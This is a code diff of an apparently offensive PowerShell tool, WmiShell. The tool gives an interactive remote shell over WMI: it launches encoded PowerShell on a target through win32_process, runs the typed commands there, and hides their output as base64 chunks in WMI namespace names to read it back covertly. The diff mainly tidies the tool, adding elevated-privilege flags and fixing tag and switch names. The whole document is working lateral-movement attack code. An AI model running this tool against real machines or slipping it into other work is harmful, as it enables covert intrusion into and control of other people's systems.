@@ -48,7 +48,7 @@ http://www.secabstraction.com/
 #>
 Param (	
     [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
-    [string[]]
+    [string]
     $ComputerName,
     
     [Parameter(ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
@@ -63,66 +63,60 @@ Param (
     
     [Parameter(ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
     [string]
-    $Tag = ([System.IO.Path]::GetRandomFileName()).Remove(8,4),
+    $Tag = ([System.IO.Path]::GetRandomFileName()).Remove(8,4)
 
-    [Parameter(Mandatory = $True)]
-    [ValidateSet('Cmd','PowerShell')]
-    [string]
-    $ShellType = 'Cmd'
 ) # End Param
-    
-    if ($ShellType -eq 'Cmd') { $ShellType = "%comspec% /c " }
-    else { $ShellType = "powershell.exe -NonI -NoP -H " }
 
     # Start WmiShell prompt
     $Command = ""
     do{ 
         # Make a pretty prompt for the user to provide commands at
-        Write-Host ("[" + $($ComputerName) + "]: WmiShell>") -nonewline -foregroundcolor green 
+        Write-Host ("[" + $($ComputerName) + "]: WmiShell>") -NoNewline -ForegroundColor green 
         $Command = Read-Host
 
         # Execute commands on remote host 
         switch ($Command) {
             "exit" { 
-                Get-WmiObject -Credential $UserName -ComputerName $ComputerName -Namespace $Namespace -Query "SELECT * FROM __Namespace WHERE Name LIKE '$Tag%' OR Name LIKE 'OUTPUT_READY'" | Remove-WmiObject
+                Get-WmiObject -EnableAllPrivileges -Credential $UserName -ComputerName $ComputerName -Namespace $Namespace `
+                              -Query "SELECT * FROM __Namespace WHERE Name LIKE '$Tag%' OR Name LIKE 'OUTPUT_READY'" | Remove-WmiObject
             }
             default { 
                 $RemoteScript = @"
-                Get-WmiObject -Namespace $Namespace -Query "SELECT * FROM __Namespace WHERE Name LIKE '$Tag%' OR Name LIKE 'OUTPUT_READY'" | Remove-WmiObject
-                `$WScriptShell = New-Object -c WScript.Shell
-                function Insert-Piece(`$i, `$piece) {
-                    `$Count = `$i.ToString()
-	                `$Zeros = "0" * (6 - `$count.Length)
-	                `$Tag = "$Tag" + `$Zeros + `$count
-	                `$Piece = `$Tag + `$piece + `$Tag
-	                Set-WmiInstance -EnableAll -Namespace $Namespace -Path __Namespace -PutType CreateOnly -Arguments @{Name=`$Piece}
-                }
-	                `$ShellExec = `$WScriptShell.Exec("$ShellType" + "$Command") 
-	                `$ShellOutput = `$ShellExec.StdOut.ReadAll()
-                    `$WmiEncoded = ([System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes(`$ShellOutput))) -replace '\+',[char]0x00F3 -replace '/','_' -replace '=',''
-                    `$NumberOfPieces = [Math]::Floor(`$WmiEncoded.Length / 5500)
-                    if (`$WmiEncoded.Length -gt 5500) {
-                        `$LastPiece = `$WmiEncoded.Substring(`$WmiEncoded.Length - (`$WmiEncoded.Length % 5500), (`$WmiEncoded.Length % 5500))
-                        `$WmiEncoded = `$WmiEncoded.Remove(`$WmiEncoded.Length - (`$WmiEncoded.Length % 5500), (`$WmiEncoded.Length % 5500))
-                        for(`$i = 1; `$i -le `$NumberOfPieces; `$i++) { 
-	                        `$piece = `$WmiEncoded.Substring(0,5500)
-		                    `$WmiEncoded = `$WmiEncoded.Substring(5500,(`$WmiEncoded.Length - 5500))
-		                    Insert-Piece `$i `$piece
-                        }
-                        `$WmiEncoded = `$LastPiece
-                    }
-	                Insert-Piece (`$NumberOfPieces + 1) `$WmiEncoded 
-	                Set-WmiInstance -EnableAll -Namespace $Namespace -Path __Namespace -PutType CreateOnly -Arguments @{Name='OUTPUT_READY'}
+Get-WmiObject -Namespace $Namespace -Query "SELECT * FROM __Namespace WHERE Name LIKE '$Tag%' OR Name LIKE 'OUTPUT_READY'" | Remove-WmiObject
+`$WScriptShell = New-Object -c WScript.Shell
+function Insert-Piece(`$i, `$piece) {
+    `$Count = `$i.ToString()
+	`$Zeros = "0" * (6 - `$Count.Length)
+	`$Tag = "$Tag" + `$Zeros + `$Count
+	`$Piece = `$Tag + `$piece + `$Tag
+	`$null = Set-WmiInstance -EnableAll -Namespace $Namespace -Path __Namespace -PutType CreateOnly -Arguments @{Name=`$Piece}
+}
+`$ShellExec = `$WScriptShell.Exec("%comspec% /c" + "$Command") 
+`$ShellOutput = `$ShellExec.StdOut.ReadAll()
+`$WmiEncoded = ([System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes(`$ShellOutput))) -replace '\+',[char]0x00F3 -replace '/','_' -replace '=',''
+`$NumberOfPieces = [Math]::Floor(`$WmiEncoded.Length / 5500)
+if (`$WmiEncoded.Length -gt 5500) {
+    `$LastPiece = `$WmiEncoded.Substring(`$WmiEncoded.Length - (`$WmiEncoded.Length % 5500), (`$WmiEncoded.Length % 5500))
+    `$WmiEncoded = `$WmiEncoded.Remove(`$WmiEncoded.Length - (`$WmiEncoded.Length % 5500), (`$WmiEncoded.Length % 5500))
+    for(`$i = 1; `$i -le `$NumberOfPieces; `$i++) { 
+	    `$piece = `$WmiEncoded.Substring(0,5500)
+		`$WmiEncoded = `$WmiEncoded.Substring(5500,(`$WmiEncoded.Length - 5500))
+		Insert-Piece `$i `$piece
+    }
+    `$WmiEncoded = `$LastPiece
+}
+Insert-Piece (`$NumberOfPieces + 1) `$WmiEncoded 
+Set-WmiInstance -EnableAll -Namespace $Namespace -Path __Namespace -PutType CreateOnly -Arguments @{Name='OUTPUT_READY'}
 "@
                 $ScriptBlock = [scriptblock]::Create($RemoteScript)
                 $EncodedPosh = Out-EncodedCommand -NoProfile -NonInteractive -ScriptBlock $ScriptBlock
-                $null = Invoke-WmiMethod -ComputerName $ComputerName -Credential $UserName -Class win32_process -Name create -ArgumentList $EncodedPosh
+                $null = Invoke-WmiMethod -EnableAllPrivileges -ComputerName $ComputerName -Credential $UserName -Class win32_process -Name create -ArgumentList $EncodedPosh
                     
                 # Wait for script to finish writing output to WMI namespaces
                 $outputReady = ""
-                do{$outputReady = Get-WmiObject -ComputerName $ComputerName -Credential $UserName -Namespace $Namespace -Query "SELECT Name FROM __Namespace WHERE Name like 'OUTPUT_READY'"}
+                do{$outputReady = Get-WmiObject -EnableAllPrivileges -ComputerName $ComputerName -Credential $UserName -Namespace $Namespace -Query "SELECT Name FROM __Namespace WHERE Name like 'OUTPUT_READY'"}
                 until($outputReady)
-                Get-WmiObject -Credential $UserName -ComputerName $ComputerName -Namespace $Namespace -Query "SELECT * FROM __Namespace WHERE Name LIKE 'OUTPUT_READY'" | Remove-WmiObject
+                Get-WmiObject -EnableAllPrivileges -Credential $UserName -ComputerName $ComputerName -Namespace $Namespace -Query "SELECT * FROM __Namespace WHERE Name LIKE 'OUTPUT_READY'" | Remove-WmiObject
                     
                 # Retrieve cmd output written to WMI namespaces 
                 Get-WmiShellOutput -UserName $UserName -ComputerName $ComputerName -Namespace $Namespace -Tag $Tag
@@ -130,6 +124,7 @@ Param (
         }
     }until($Command -eq "exit")
 }
+
 function Get-WmiShellOutput{
 <#
 .SYNOPSIS
@@ -188,8 +183,8 @@ Param (
 ) #End Param
 	
 	$GetOutput = @() 
-	$GetOutput = Get-WmiObject -ComputerName $ComputerName -Credential $UserName -Namespace root\default `
-                    -Query "SELECT Name FROM __Namespace WHERE Name like 'EVILLTAG%'" | % {$_.Name} | Sort-Object
+	$GetOutput = Get-WmiObject -EnableAllPrivileges -ComputerName $ComputerName -Credential $UserName -Namespace root\default `
+                    -Query "SELECT Name FROM __Namespace WHERE Name like '$Tag%'" | % {$_.Name} | Sort-Object
 	
 	if ([BOOL]$GetOutput.Length) {
 		
@@ -214,6 +209,7 @@ Param (
 		Write-Host $DecodedOutput    
     }
 }
+
 function Out-EncodedCommand {
 <#
 .SYNOPSIS
@@ -302,7 +298,7 @@ http://www.exploit-monday.com
         $NoExit,
 
         [Switch]
-        $NumberOfPiecesrofile,
+        $NoProfile,
 
         [Switch]
         $NonInteractive,
